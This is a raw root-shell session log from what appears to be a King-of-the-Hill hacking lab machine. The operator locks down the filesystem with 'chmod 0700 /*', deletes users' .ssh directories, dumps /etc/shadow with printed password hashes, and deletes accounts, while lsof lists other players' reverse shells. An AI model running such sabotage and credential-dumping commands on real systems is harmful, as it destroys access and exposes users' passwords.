bash: cannot set terminal process group (1296): Inappropriate ioctl for device
bash: no job control in this shell
root@spacejam:/# w
 07:36:34 up 2 min,  0 users,  load average: 0.69, 0.79, 0.34
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/# which python*
root@spacejam:/# .
root@spacejam:/# id
uid=0(root) gid=0(root) groups=0(root)
root@spacejam:/# which python
/usr/bin/python
root@spacejam:/# which python3
/usr/bin/python3
root@spacejam:/# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@spacejam:/# 
root@spacejam:/# export TERM=xterm
root@spacejam:/# .[H.[2Jroot@spacejam:/# w
 07:37:17 up 3 min,  0 users,  load average: 0.60, 0.76, 0.35
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/# chmod 0700 /or..[K..[Kro..[K..[K..[K..[K..[K..[K..[K..[K..[K..[K..[K..[K..[K..[K...ls -la /
total 96
drwxr-xr-x  23 root root  4096 Nov 18 07:36 .[0m.[01;34m..[0m
drwxr-xr-x  23 root root  4096 Nov 18 07:36 .[01;34m...[0m
drwxr-xr-x   2 root root  4096 Apr  4  2020 .[01;34mbin.[0m
drwxr-xr-x   3 root root  4096 Feb 25  2020 .[01;34mboot.[0m
drwxr-xr-x  17 root root  3700 Nov 18 07:34 .[01;34mdev.[0m
drwxr-xr-x 103 root root  4096 Nov 18 07:36 .[01;34metc.[0m
drwxr-xr-x   4 root root  4096 Feb 25  2020 .[01;34mhome.[0m
lrwxrwxrwx   1 root root    33 Feb 25  2020 .[01;36minitrd.img.[0m -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x  22 root root  4096 Feb 25  2020 .[01;34mlib.[0m
drwxr-xr-x   2 root root  4096 Feb 25  2020 .[01;34mlib64.[0m
drwx------   2 root root 16384 Feb 25  2020 .[01;34mlost+found.[0m
drwxr-xr-x   3 root root  4096 Feb 25  2020 .[01;34mmedia.[0m
drwxr-xr-x   2 root root  4096 Feb 26  2019 .[01;34mmnt.[0m
drwxr-xr-x   2 root root  4096 Feb 26  2019 .[01;34mopt.[0m
dr-xr-xr-x 193 root root     0 Nov 18 07:33 .[01;34mproc.[0m
drwx------   7 root root  4096 Apr  4  2020 .[01;34mroot.[0m
drwxr-xr-x  25 root root   920 Nov 18 07:37 .[01;34mrun.[0m
drwxr-xr-x   2 root root 12288 Feb 25  2020 .[01;34msbin.[0m
drwxr-xr-x   2 root root  4096 Feb 25  2020 .[01;34msnap.[0m
drwxr-xr-x   3 root root  4096 Feb 25  2020 .[01;34msrv.[0m
dr-xr-xr-x  13 root root     0 Nov 18 07:33 .[01;34msys.[0m
drwxrwxrwt   8 root root  4096 Nov 18 07:35 .[30;42mtmp.[0m
drwxr-xr-x  10 root root  4096 Feb 25  2020 .[01;34musr.[0m
drwxr-xr-x  14 root root  4096 Feb 25  2020 .[01;34mvar.[0m
lrwxrwxrwx   1 root root    30 Feb 25  2020 .[01;36mvmlinuz.[0m -> boot/vmlinuz-4.4.0-142-generic
root@spacejam:/# chmod 0700 /*
root@spacejam:/# ls -al /
total 96
drwxr-xr-x  23 root root  4096 Nov 18 07:36 .[0m.[01;34m..[0m
drwxr-xr-x  23 root root  4096 Nov 18 07:36 .[01;34m...[0m
drwx------   2 root root  4096 Apr  4  2020 .[01;34mbin.[0m
drwx------   3 root root  4096 Feb 25  2020 .[01;34mboot.[0m
drwx------  17 root root  3700 Nov 18 07:34 .[01;34mdev.[0m
drwx------ 103 root root  4096 Nov 18 07:36 .[01;34metc.[0m
drwx------   4 root root  4096 Feb 25  2020 .[01;34mhome.[0m
lrwxrwxrwx   1 root root    33 Feb 25  2020 .[01;36minitrd.img.[0m -> boot/initrd.img-4.4.0-142-generic
drwx------  22 root root  4096 Feb 25  2020 .[01;34mlib.[0m
drwx------   2 root root  4096 Feb 25  2020 .[01;34mlib64.[0m
drwx------   2 root root 16384 Feb 25  2020 .[01;34mlost+found.[0m
drwx------   3 root root  4096 Feb 25  2020 .[01;34mmedia.[0m
drwx------   2 root root  4096 Feb 26  2019 .[01;34mmnt.[0m
drwx------   2 root root  4096 Feb 26  2019 .[01;34mopt.[0m
drwx------ 190 root root     0 Nov 18 07:33 .[01;34mproc.[0m
drwx------   7 root root  4096 Apr  4  2020 .[01;34mroot.[0m
drwx------  25 root root   920 Nov 18 07:37 .[01;34mrun.[0m
drwx------   2 root root 12288 Feb 25  2020 .[01;34msbin.[0m
drwx------   2 root root  4096 Feb 25  2020 .[01;34msnap.[0m
drwx------   3 root root  4096 Feb 25  2020 .[01;34msrv.[0m
drwx------  13 root root     0 Nov 18 07:37 .[01;34msys.[0m
drwx------   8 root root  4096 Nov 18 07:35 .[01;34mtmp.[0m
drwx------  10 root root  4096 Feb 25  2020 .[01;34musr.[0m
drwx------  14 root root  4096 Feb 25  2020 .[01;34mvar.[0m
lrwxrwxrwx   1 root root    30 Feb 25  2020 .[01;36mvmlinuz.[0m -> boot/vmlinuz-4.4.0-142-generic
root@spacejam:/# cd /home
root@spacejam:/home# rm -rf */.ssh
root@spacejam:/home# ls -la
total 16
drwx------  4 root   root   4096 Feb 25  2020 .[0m.[01;34m..[0m
drwxr-xr-x 23 root   root   4096 Nov 18 07:36 .[01;34m...[0m
drwxr-xr-x  7 bunny  bunny  4096 Mar  4  2020 .[01;34mbunny.[0m
drwxr-xr-x  3 jordan jordan 4096 Nov 18 07:38 .[01;34mjordan.[0m
root@spacejam:/home# cat /etc/shadow
root:$6$a.kpa8p7$8MyQWqdXi8kIyb4CgqAViyCa51fW55x0m3paAVcXESs3t03iuUuLq9OQRsoHk7c5HhIsBC5HDddfXWElTK1Ha0:18317:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
lxd:*:18317:0:99999:7:::
mysql:!:18317:0:99999:7:::
messagebus:*:18317:0:99999:7:::
uuidd:*:18317:0:99999:7:::
dnsmasq:*:18317:0:99999:7:::
sshd:*:18317:0:99999:7:::
jordan:$6$6jKm02ie$qiEzYLKjGwoxz5Fl.r/oSXEqeX3qgAZRKmZqdz8GFpTck6lj5b3RUhA6weUckJSFHuFdAbvdI6K5YWGx7N5Ph.:18317:0:99999:7:::
bunny:$6$HOScqZHA$ewn.WIghxLt7yv.nn.6jtaR8HNaKGklcG5bQqZirIDtZUNIgnek3JREVx.0huE8.oYYsaGJv4FTJhLR296czW1:18317:0:99999:7:::
telnetd:*:18317:0:99999:7:::
colord:*:18317:0:99999:7:::
postgres:*:18317:0:99999:7:::
root@spacejam:/home# ls -la
total 16
drwx------  4 root   root   4096 Feb 25  2020 .[0m.[01;34m..[0m
drwxr-xr-x 23 root   root   4096 Nov 18 07:36 .[01;34m...[0m
drwxr-xr-x  7 bunny  bunny  4096 Mar  4  2020 .[01;34mbunny.[0m
drwxr-xr-x  3 jordan jordan 4096 Nov 18 07:38 .[01;34mjordan.[0m
root@spacejam:/home# userdel bunny
root@spacejam:/home# userdel jordan
userdel: user jordan is currently used by process 1219
root@spacejam:/home# ls -la
total 16
drwx------  4 root   root   4096 Feb 25  2020 .[0m.[01;34m..[0m
drwxr-xr-x 23 root   root   4096 Nov 18 07:36 .[01;34m...[0m
drwxr-xr-x  7   1001   1001 4096 Mar  4  2020 .[01;34mbunny.[0m
drwxr-xr-x  3 jordan jordan 4096 Nov 18 07:38 .[01;34mjordan.[0m
root@spacejam:/home# lsof -i -P -n
COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
dhclient   723     root    6u  IPv4  12659      0t0  UDP *:68 
inetd      862     root    4u  IPv4  13383      0t0  TCP *:23 (LISTEN)
koth       925     root    3u  IPv6  14498      0t0  TCP *:9999 (LISTEN)
mysqld     993    mysql   22u  IPv4  17109      0t0  TCP 127.0.0.1:3306 (LISTEN)
sshd      1006     root    3u  IPv4  15436      0t0  TCP *:22 (LISTEN)
sshd      1006     root    4u  IPv6  15445      0t0  TCP *:22 (LISTEN)
postgres  1163 postgres    4u  IPv6  16881      0t0  TCP [::1]:5432 (LISTEN)
postgres  1163 postgres    5u  IPv4  16882      0t0  TCP 127.0.0.1:5432 (LISTEN)
postgres  1163 postgres    9u  IPv6  16890      0t0  UDP [::1]:37372->[::1]:37372 
apache2   1166     root    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
postgres  1191 postgres    9u  IPv6  16890      0t0  UDP [::1]:37372->[::1]:37372 
postgres  1192 postgres    9u  IPv6  16890      0t0  UDP [::1]:37372->[::1]:37372 
postgres  1193 postgres    9u  IPv6  16890      0t0  UDP [::1]:37372->[::1]:37372 
postgres  1194 postgres    9u  IPv6  16890      0t0  UDP [::1]:37372->[::1]:37372 
postgres  1195 postgres    9u  IPv6  16890      0t0  UDP [::1]:37372->[::1]:37372 
apache2   1219   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1219   jordan   12u  IPv6  21289      0t0  TCP 10.10.46.213:80->10.8.160.93:50324 (ESTABLISHED)
apache2   1238   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1238   jordan   12u  IPv6  21275      0t0  TCP 10.10.46.213:80->10.8.160.93:50280 (ESTABLISHED)
apache2   1239   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1239   jordan   12u  IPv6  21286      0t0  TCP 10.10.46.213:80->10.17.46.25:38430 (ESTABLISHED)
apache2   1240   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1240   jordan   12u  IPv6  20617      0t0  TCP 10.10.46.213:80->10.17.46.25:56932 (ESTABLISHED)
apache2   1243   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1243   jordan   12u  IPv6  20580      0t0  TCP 10.10.46.213:80->10.17.46.25:56872 (ESTABLISHED)
apache2   1245   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1245   jordan   12u  IPv6  21300      0t0  TCP 10.10.46.213:80->10.17.46.25:38478 (ESTABLISHED)
apache2   1247   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1247   jordan   12u  IPv6  21293      0t0  TCP 10.10.46.213:80->10.8.160.93:50366 (ESTABLISHED)
apache2   1248   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1248   jordan   12u  IPv6  21298      0t0  TCP 10.10.46.213:80->10.17.46.25:38464 (ESTABLISHED)
apache2   1249   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1249   jordan   12u  IPv6  20623      0t0  TCP 10.10.46.213:80->10.17.46.25:56960 (ESTABLISHED)
apache2   1252   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1252   jordan   12u  IPv6  21291      0t0  TCP 10.10.46.213:80->10.8.160.93:50292 (ESTABLISHED)
http      1287     _apt    3u  IPv4  19742      0t0  TCP 10.10.46.213:34498->147.75.85.69:80 (SYN_SENT)
http      1289     _apt    3u  IPv4  19739      0t0  TCP 10.10.46.213:59638->185.125.190.39:80 (SYN_SENT)
http      1290     _apt    3u  IPv4  19743      0t0  TCP 10.10.46.213:56422->91.189.91.38:80 (SYN_SENT)
node      1308     root   18u  IPv6  17762      0t0  TCP *:3000 (LISTEN)
node      1308     root   19u  IPv6  17882      0t0  TCP 10.10.46.213:3000->10.2.66.237:51004 (ESTABLISHED)
node      1308     root   21u  IPv6  19407      0t0  TCP 10.10.46.213:3000->10.17.76.221:43890 (ESTABLISHED)
apache2   1315   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1315   jordan   12u  IPv6  21301      0t0  TCP 10.10.46.213:80->10.8.160.93:50352 (ESTABLISHED)
apache2   1317   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1322   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1323   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1323   jordan   12u  IPv6  21299      0t0  TCP 10.10.46.213:80->10.17.46.25:38472 (ESTABLISHED)
bash      1327     root    0u  IPv4  17904      0t0  TCP 10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED)
bash      1327     root    1u  IPv4  17904      0t0  TCP 10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED)
bash      1327     root    2u  IPv4  17904      0t0  TCP 10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED)
bash      1327     root  255u  IPv4  17904      0t0  TCP 10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED)
apache2   1337   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1337   jordan   12u  IPv6  20629      0t0  TCP 10.10.46.213:80->10.17.46.25:38394 (ESTABLISHED)
apache2   1340   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1340   jordan   12u  IPv6  21285      0t0  TCP 10.10.46.213:80->10.17.46.25:38428 (ESTABLISHED)
apache2   1344   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1344   jordan   12u  IPv6  21302      0t0  TCP 10.10.46.213:80->10.17.46.25:38494 (ESTABLISHED)
apache2   1345   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1345   jordan   12u  IPv6  21284      0t0  TCP 10.10.46.213:80->10.17.46.25:38414 (ESTABLISHED)
tcpdump   1349     root    1u  IPv4  17904      0t0  TCP 10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED)
tcpdump   1349     root    2u  IPv4  17904      0t0  TCP 10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED)
systemd-p 1361     root    1u  IPv4  17904      0t0  TCP 10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED)
systemd-p 1361     root    2u  IPv4  17904      0t0  TCP 10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED)
python3   1380   jordan    3u  IPv4  18934      0t0  TCP *:61432 (LISTEN)
python3   1380   jordan    4u  IPv4  18935      0t0  TCP 10.10.46.213:61432->10.17.46.25:42148 (ESTABLISHED)
apache2   1384   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1384   jordan   12u  IPv6  20626      0t0  TCP 10.10.46.213:80->10.17.46.25:38388 (ESTABLISHED)
python    1399     root    0u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
python    1399     root    1u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
python    1399     root    2u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
python    1399     root    3u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
bash      1400     root    0u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
bash      1400     root    1u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
bash      1400     root    2u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
bash      1400     root    3u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
bash      1400     root  255u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
apache2   1413   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1413   jordan   12u  IPv6  21297      0t0  TCP 10.10.46.213:80->10.17.46.25:38454 (ESTABLISHED)
apache2   1414   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1414   jordan   12u  IPv6  21288      0t0  TCP 10.10.46.213:80->10.8.160.93:50306 (ESTABLISHED)
apache2   1415   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1415   jordan   12u  IPv6  21287      0t0  TCP 10.10.46.213:80->10.17.46.25:38434 (ESTABLISHED)
apache2   1417   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1417   jordan   12u  IPv6  20586      0t0  TCP 10.10.46.213:80->10.17.46.25:56900 (ESTABLISHED)
apache2   1418   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1418   jordan   12u  IPv6  20578      0t0  TCP 10.10.46.213:80->10.17.46.25:56856 (ESTABLISHED)
apache2   1419   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1419   jordan   12u  IPv6  21281      0t0  TCP 10.10.46.213:80->10.8.160.93:50290 (ESTABLISHED)
apache2   1420   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1420   jordan   12u  IPv6  20579      0t0  TCP 10.10.46.213:80->10.17.46.25:56862 (ESTABLISHED)
apache2   1424   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1424   jordan   12u  IPv6  20630      0t0  TCP 10.10.46.213:80->10.17.46.25:38404 (ESTABLISHED)
apache2   1425   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1427   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1427   jordan   12u  IPv6  20587      0t0  TCP 10.10.46.213:80->10.17.46.25:56916 (ESTABLISHED)
apache2   1428   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1429   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1429   jordan   12u  IPv6  21279      0t0  TCP 10.10.46.213:80->10.8.160.93:50336 (ESTABLISHED)
apache2   1430   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1430   jordan   12u  IPv6  20583      0t0  TCP 10.10.46.213:80->10.17.46.25:56884 (ESTABLISHED)
apache2   1431   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1431   jordan   12u  IPv6  21290      0t0  TCP 10.10.46.213:80->10.8.160.93:50308 (ESTABLISHED)
apache2   1435   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1435   jordan   12u  IPv6  20620      0t0  TCP 10.10.46.213:80->10.17.46.25:56948 (ESTABLISHED)
apache2   1436   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1436   jordan   12u  IPv6  20624      0t0  TCP 10.10.46.213:80->10.17.46.25:56970 (ESTABLISHED)
apache2   1437   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1437   jordan   12u  IPv6  20625      0t0  TCP 10.10.46.213:80->10.8.160.93:45238 (ESTABLISHED)
apache2   1441   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1443   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1443   jordan   12u  IPv6  21292      0t0  TCP 10.10.46.213:80->10.17.46.25:38446 (ESTABLISHED)
apache2   1445   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1445   jordan   12u  IPv6  20616      0t0  TCP 10.10.46.213:80->10.17.46.25:56924 (ESTABLISHED)
apache2   1446   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
apache2   1446   jordan   12u  IPv6  20564      0t0  TCP 10.10.46.213:80->10.17.46.25:55236 (ESTABLISHED)
apache2   1449   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
python3   1457     root    0u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
python3   1457     root    1u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
python3   1457     root    2u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
python3   1457     root    3u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
bash      1458     root    3u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
sshd      1470     root    3u  IPv4  19883      0t0  TCP 10.10.46.213:22->10.2.66.237:60176 (ESTABLISHED)
check-new 1496     root    3u  IPv4  21294      0t0  TCP 10.10.46.213:42914->185.125.190.18:80 (SYN_SENT)
sshd      1533   jordan    3u  IPv4  19883      0t0  TCP 10.10.46.213:22->10.2.66.237:60176 (ESTABLISHED)
apache2   1581   jordan    4u  IPv6  16857      0t0  TCP *:80 (LISTEN)
root@spacejam:/home# lsof -i -P -n|grep `..[K10.10.*.[H.[2Jroot@spacejam:/home# lsof -i -P -n|grep 10.10.*
koth       925     root    5u  IPv6  22803      0t0  TCP .[01;31m.[K10.10.46.213:9999->10.17.76.221:54206 (ESTABLISHED).[m.[K
apache2   1219   jordan   12u  IPv6  21289      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:50324 (ESTABLISHED).[m.[K
apache2   1239   jordan   12u  IPv6  21286      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38430 (ESTABLISHED).[m.[K
apache2   1240   jordan   12u  IPv6  20617      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56932 (ESTABLISHED).[m.[K
apache2   1243   jordan   12u  IPv6  20580      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56872 (ESTABLISHED).[m.[K
apache2   1245   jordan   12u  IPv6  21300      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38478 (ESTABLISHED).[m.[K
apache2   1248   jordan   12u  IPv6  21298      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38464 (ESTABLISHED).[m.[K
apache2   1249   jordan   12u  IPv6  20623      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56960 (ESTABLISHED).[m.[K
http      1287     _apt    3u  IPv4  22782      0t0  TCP .[01;31m.[K10.10.46.213:33968->217.196.149.55:80 (SYN_SENT).[m.[K
http      1289     _apt    3u  IPv4  22779      0t0  TCP .[01;31m.[K10.10.46.213:33166->91.189.91.81:80 (SYN_SENT).[m.[K
http      1290     _apt    3u  IPv4  22788      0t0  TCP .[01;31m.[K10.10.46.213:40086->91.189.91.82:80 (SYN_SENT).[m.[K
node      1308     root   19u  IPv6  17882      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.2.66.237:51004 (ESTABLISHED).[m.[K
node      1308     root   21u  IPv6  19407      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.17.76.221:43890 (ESTABLISHED).[m.[K
node      1308     root   23u  IPv6  22791      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.17.46.25:35622 (ESTABLISHED).[m.[K
node      1308     root   26u  IPv6  22801      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.17.46.25:35634 (ESTABLISHED).[m.[K
apache2   1315   jordan   12u  IPv6  21301      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:50352 (ESTABLISHED).[m.[K
apache2   1322   jordan   12u  IPv6  21319      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:50340 (ESTABLISHED).[m.[K
apache2   1323   jordan   12u  IPv6  21299      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38472 (ESTABLISHED).[m.[K
bash      1327     root    0u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root  255u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
apache2   1337   jordan   12u  IPv6  20629      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38394 (ESTABLISHED).[m.[K
apache2   1340   jordan   12u  IPv6  21285      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38428 (ESTABLISHED).[m.[K
apache2   1344   jordan   12u  IPv6  21302      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38494 (ESTABLISHED).[m.[K
apache2   1345   jordan   12u  IPv6  21284      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38414 (ESTABLISHED).[m.[K
tcpdump   1349     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
tcpdump   1349     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
systemd-p 1361     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
systemd-p 1361     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
python3   1380   jordan    4u  IPv4  18935      0t0  TCP .[01;31m.[K10.10.46.213:61432->10.17.46.25:42148 (ESTABLISHED).[m.[K
apache2   1384   jordan   12u  IPv6  20626      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38388 (ESTABLISHED).[m.[K
python    1399     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1399     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1399     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1399     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root  255u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
apache2   1413   jordan   12u  IPv6  21297      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38454 (ESTABLISHED).[m.[K
apache2   1415   jordan   12u  IPv6  21287      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38434 (ESTABLISHED).[m.[K
apache2   1417   jordan   12u  IPv6  20586      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56900 (ESTABLISHED).[m.[K
apache2   1418   jordan   12u  IPv6  20578      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56856 (ESTABLISHED).[m.[K
apache2   1420   jordan   12u  IPv6  20579      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56862 (ESTABLISHED).[m.[K
apache2   1424   jordan   12u  IPv6  20630      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38404 (ESTABLISHED).[m.[K
apache2   1425   jordan   12u  IPv6  21334      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:57366 (ESTABLISHED).[m.[K
apache2   1427   jordan   12u  IPv6  20587      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56916 (ESTABLISHED).[m.[K
apache2   1428   jordan   12u  IPv6  21320      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:50338 (ESTABLISHED).[m.[K
apache2   1429   jordan   12u  IPv6  21279      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:50336 (FIN_WAIT1).[m.[K
apache2   1430   jordan   12u  IPv6  20583      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56884 (ESTABLISHED).[m.[K
apache2   1435   jordan   12u  IPv6  20620      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56948 (ESTABLISHED).[m.[K
apache2   1436   jordan   12u  IPv6  20624      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56970 (ESTABLISHED).[m.[K
apache2   1437   jordan   12u  IPv6  22771      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:57356 (ESTABLISHED).[m.[K
apache2   1441   jordan   12u  IPv6  21338      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:57414 (ESTABLISHED).[m.[K
apache2   1443   jordan   12u  IPv6  21292      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:38446 (ESTABLISHED).[m.[K
